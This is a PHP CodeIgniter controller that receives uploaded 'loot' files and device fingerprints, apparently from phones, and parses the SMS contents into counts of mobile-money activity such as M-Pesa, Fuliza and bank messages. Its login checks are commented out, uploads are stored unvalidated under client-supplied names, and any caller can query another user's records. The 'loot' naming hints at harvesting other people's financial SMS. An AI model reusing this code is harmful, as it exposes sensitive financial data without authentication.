<?php

namespace App\Controllers;

use App\Models\ModUser;
use CodeIgniter\API\ResponseTrait;
use CodeIgniter\Controller;

use App\Models\ModUploads;
use App\Models\ModCryption;


class Upload extends BaseController
{
    use ResponseTrait;

    public function upload(){
        $mod_upload = new ModUploads();
        $mod_user = new ModUser();
        $mod_cryption = new ModCryption();
        $session = session();

        $dated = date('Y-m-d H:i:s');
        $uuid = random_string('alnum', 16);

        if (empty($session->get('user_name'))){
            //return "Not Logged In";
        }

        if ($this->request->getPost()){
            //$loot_owner = $mod_user->user_get_id($this->request->getVar('varToken'));
            $loot_owner = $this->request->getVar('varToken');
            $loot_device = $this->request->getVar('varDevId');

            $uploaded_File = $this->request->getFile('varLoot');

            echo $uploaded_File->getSize();

            $uploaded_File->move(WRITEPATH . 'uploads/txt_loot/');

            $data = [
                'loot_Name' =>  $uploaded_File->getName(),
                'loot_Type'  => $uploaded_File->getClientMimeType(),
                'loot_Extension'  => $uploaded_File->getClientExtension(),
                'loot_Size'  => $uploaded_File->getSize(),
                'loot_Owner'  => $loot_owner,
                'loot_Uuid'  => $uuid,
                'loot_Device'  => $loot_device,
                'loot_Created'  => $dated
            ];

            $pushed = $mod_upload->file_upload($data);
            $loot_uuid = $uuid; //$mod_upload->loot_last_uploaded();
            $mod_upload->loot_parse_sms($loot_uuid, $loot_owner, $loot_device, $dated);
            
            if ($pushed){
                return $this->respond([
                    'status' => 1,
                    'time' => $dated,
                    'message' => "File Uploaded Successfully"
                ]);
            }else{
                return $this->respond([
                    'status' => 0,
                    'time' => $dated,
                    'message' => "File Uploaded has encountered an error"
                ]);
            }

        }else{
            return $this->respond([
                'status' => 2,
                'time' => $dated,
                'message' => "Unexpected request sent"
            ]);
        }
    }

    public function device_print(){
        $mod_upload = new ModUploads();
        $mod_crypt = new ModCryption();
        $session = session();

        $dated = date('Y-m-d H:i:s');
        $uuid = random_string('alnum', 16);

        if (empty($session->get('user_name'))){
            //echo "Not Logged In";
        }

        if ($this->request->getPost()){
            $d_info['device_Device'] = $this->request->getVar('device_Device');
            $d_info['device_Uuid'] = $uuid;
            $d_info['device_Created_At'] = $dated;
            $d_info['device_Product'] = $this->request->getVar('device_Product');
            $d_info['device_Bootloader'] = $this->request->getVar('device_Bootloader');
            $d_info['device_Type'] = $this->request->getVar('device_Type');
            $d_info['device_Tags'] = $this->request->getVar('device_Tags');
            $d_info['device_Host'] = $this->request->getVar('device_Host');
            $d_info['device_Display'] = $this->request->getVar('device_Display');
            $d_info['device_Hardware'] = $this->request->getVar('device_Hardware');
            $d_info['device_Fingerprint'] = $this->request->getVar('device_Fingerprint');
            $d_info['device_Manufacturer'] = $this->request->getVar('device_Manufacturer');
            $d_info['device_Brand'] = $this->request->getVar('device_Brand');
            $d_info['device_Board'] = $this->request->getVar('device_Board');
            $d_info['device_User'] = $this->request->getVar('device_User');
            $d_info['device_Model'] = $this->request->getVar('device_Model');
            $d_info['device_Time'] = $this->request->getVar('device_Time');
            $d_info['device_Serial'] = $this->request->getVar('device_Serial');

            $dev_check = $mod_upload->device_check_print($d_info);
            if (empty($dev_check)){
                $dev_make = $mod_upload->device_make_print($d_info);
                if ($dev_make){
                    $dev_check = $mod_upload->device_check_print($d_info);
                    return $this->respond([
                        'status' => 1,
                        'message' => "New Id assigned device_id as ",
                        //'print_id' => $dev_check[0]->device_Id,
                        'print_id' => $dev_check[0]->device_Uuid,
                        'time' => $dated,
                    ]);
                }else{}
            }else{
                return $this->respond([
                    'status' => 1,
                    'message' => "Old Id re-assigned device_id as ",
                    //'print_id' => $dev_check[0]->device_Id,
                    'print_id' => $dev_check[0]->device_Uuid,
                    'time' => $dated,
                ]);
            }
        }else{
            return $this->respond([
                'status' => 2,
                'time' => $dated,
                'message' => "Unexpected request sent"
            ]);
        }
    }

    public function upload_listing(){
        $mod_upload = new ModUploads();
        $mod_cryption = new ModCryption();
        $mod_user = new ModUser();

        $session = session();

        #echo "Username as ".$this->session->get('user_name').$session->get('user_name');

        if (empty($session->get('user_name'))){
            #echo "Not Logged In";
        }

        if ($this->request->getPost()){
            $summ_owner_uuid = $this->request->getVar('varUser');
            $summ_device = $this->request->getVar('varDev');
            $summ_owner = $mod_user->user_get_id($summ_owner_uuid);

            $loot_array = array();
            $loot_list = $mod_upload->file_listing($summ_owner_uuid, $summ_device);
            echo '{ "summarizer":[';
            $counter = 0;
            $loot_size = count($loot_list);
            foreach ($loot_list as $loot_info) {
                $counter +=1;
                $loot_meta = $mod_upload->loot_summary($loot_info->loot_Uuid); //tbl_Loot_Summary
                $data = [
                    //'summary_Type'  => $loot_info->loot_Type,
                    //'summary_Extension'  => $loot_info->loot_Extension,
                    //'summary_Size'  => $loot_info->loot_Size,
                    //'summary_Owner'  => $loot_info->loot_Owner,
                    //'summary_Device'  => $loot_info->loot_Device,
                    'summary_Created'  => $loot_info->loot_Created,
                    'summary_Count'  => $loot_meta[0]->info_All,
                    'summary_Received'  => $loot_meta[0]->info_Get_Receive,
                    'summary_Sent'  => $loot_meta[0]->info_Sent,
                    'summary_Unknown' => $loot_meta[0]->info_Unknown
                ];
                array_push($loot_array,$data);
                if ($counter == ($loot_size)){
                    print json_encode($data);
                }else{
                    print json_encode($data).",";
                }
            }
            //print_r($loot_array);
            echo "]}";
            //echo json_encode($loot_array);
        }
    }

    public function upload_summary_calculation(){
        $mod_upload = new ModUploads();
        $mod_cryption = new ModCryption();
        $mod_user = new ModUser();

        $session = session();

        $dated = date('Y-m-d H:i:s');

        #echo "Username as ".$this->session->get('user_name').$session->get('user_name');

        if (empty($session->get('user_name'))){
            #echo "Not Logged In";
        }

        if ($this->request->getPost()){
            $summ_owner_uuid = $this->request->getVar('varUser');
            $summ_device = $this->request->getVar('varDev');
            $summ_owner = $mod_user->user_get_id($summ_owner_uuid);
            $summ_loot_name = $this->request->getVar('varLootName');

            $loot__uuid = $mod_upload->get_loot_uuid($summ_loot_name);
            $loot__info = $mod_upload->loot_info_all($loot__uuid);
            $loot__summary = $mod_upload->loot_summary($loot__uuid);

            return $this->respond([
                'status' => 1,
                'count_Get_Receive' => $loot__summary[0]->info_Get_Receive,
                'count_Get_Bank' => $loot__summary[0]->info_Get_Bank,
                'count_Get_Mshwari' => $loot__summary[0]->info_Get_Mshwari,
                'count_Get_from_NCBA' => $loot__summary[0]->info_Get_from_NCBA,
                'count_Get_from_IM' => $loot__summary[0]->info_Get_from_IM,
                'count_Get_Bal' => $loot__summary[0]->info_Get_Bal,
                'count_Get_Bal_KCB' => $loot__summary[0]->info_Get_Bal_KCB,
                'count_Get_Bal_Mshwari' => $loot__summary[0]->info_Get_Bal_Mshwari,
                'count_Get_Reversal' => $loot__summary[0]->info_Get_Reversal,
                'count_Loan_Limit' => $loot__summary[0]->info_Loan_Limit,
                'count_Sent' => $loot__summary[0]->info_Sent,
                'count_Sent_Mini' => $loot__summary[0]->info_Sent_Mini,
                'count_Sent_Mshwari' => $loot__summary[0]->info_Sent_Mshwari,
                'count_Sent_Cancel' => $loot__summary[0]->info_Sent_Cancel,
                'count_Error_Failed' => $loot__summary[0]->info_Error_Failed,
                'count_Error_Pay_Merchant' => $loot__summary[0]->info_Error_Pay_Merchant,
                'count_Error_Pin' => $loot__summary[0]->info_Error_Pin,
                'count_Error_Less' => $loot__summary[0]->info_Error_Less,
                'count_Error_Receiver' => $loot__summary[0]->info_Error_Receiver,
                'count_Error_Receiver_Org' => $loot__summary[0]->info_Error_Receiver_Org,
                'count_Withdraw' => $loot__summary[0]->info_Withdraw,
                'count_Fuliza_Leave' => $loot__summary[0]->info_Fuliza_Leave,
                'count_Fuliza_Opt_In' => $loot__summary[0]->info_Fuliza_Opt_In,
                'count_Fuliza_Limit' => $loot__summary[0]->info_Fuliza_Limit,
                'count_Fuliza_Mini_Statement' => $loot__summary[0]->info_Fuliza_Mini_Statement,
                'count_Fuliza_Loan_Taken' => $loot__summary[0]->info_Fuliza_Loan_Taken,
                'count_Similar_Transaction' => $loot__summary[0]->info_Similar_Transaction,
                'count_All' => $loot__summary[0]->info_All,
                'count_Unknown' => $loot__summary[0]->info_Unknown,
                'created' => $loot__summary[0]->loot_Created,
                //'val_name' => $loot__info[0]->loot_Name,
                'time' => $dated,
            ]);
        }
    }

    public function loot_uploaded_count(){
        $mod_upload = new ModUploads();
        $mod_user = new ModUser();

        $dated = date('Y-m-d H:i:s');

        if ($this->request->getPost()){
            $loot_owner_uuid = $this->request->getVar('varUser');
            $loot_device = $this->request->getVar('varDev');
            //$loot_owner = $mod_user->user_get_id($loot_owner_uuid);
            //$loot_name = $this->request->getVar('varLootName');

            $loot_count = $mod_upload->file_listing($loot_owner_uuid, $loot_device);

            if ($loot_count){
                return $this->respond([
                    'msg_status' => 1,
                    'msg_count' => count($loot_count),
                    'msg_time' => $dated,
                ]);
            }else{
                if (empty($loot_count)){
                    return $this->respond([
                        'msg_status' => 1,
                        'msg_state' => "empty",
                        'msg_count' => 0,
                        'msg_time' => $dated,
                    ]);
                }else{
                    return $this->respond([
                        'msg_status' => 2,
                        'msg_time' => $dated,
                    ]);
                }
            }
        }
    }

	public function loot_uploaded_category_count(){
        $mod_upload = new ModUploads();
        $mod_user = new ModUser();

        $dated = date('Y-m-d H:i:s');

        if ($this->request->getPost()){
            $loot_owner_uuid = $this->request->getVar('varUser');
            $loot_device = $this->request->getVar('varDev');
            //$loot_owner = $mod_user->user_get_id($loot_owner_uuid);
            //$loot_name = $this->request->getVar('varLootName');

            $loot_entries = $mod_upload->file_listing($loot_owner_uuid, $loot_device);
			$loot_uuids = array();

			foreach ($loot_entries as $loot_entry){
				array_push($loot_uuids, $loot_entry->loot_Uuid);
			}

	        $loot_category_count = $mod_upload->get_loot_summary_from_uuids($loot_uuids);

	        //$loot_json = '';
	        //$loot_json .= '{"loot_summarizer":[';
	        echo '{"loot_summarizer":[';
	        $counter = 0;
	        $loot_size = count($loot_category_count);
	        $loot_summary = array();
	        foreach ($loot_category_count as $loot_info) {
		        $counter +=1;
		        $data = [
			        'val_all' => $loot_info->info_All,
			        'val_balance' => $loot_info->info_Get_Bal,
			        'val_fuliza' => $loot_info->info_Fuliza_Loan_Taken,
			        'val_received' => $loot_info->info_Get_Receive,
			        'val_sent' => $loot_info->info_Sent,
			        'val_withdraw' => $loot_info->info_Withdraw,
			        'val_wrong_pin' => $loot_info->info_Error_Pin,
			        'val_unknown' => $loot_info->info_Unknown,
			        'val_created' => $loot_info->loot_Created,
		        ];
		        array_push($loot_summary,$data);
		        if ($counter == ($loot_size)){
			        print json_encode($data);
			        //$loot_json .= json_encode($data);
		        }else{
			        print json_encode($data).",";
			        //$loot_json .= json_encode($data).",";
		        }
	        }
	        echo "]}";
	        //$loot_json .= "]}";
			//return json_encode($loot_json);
        }
    }

}
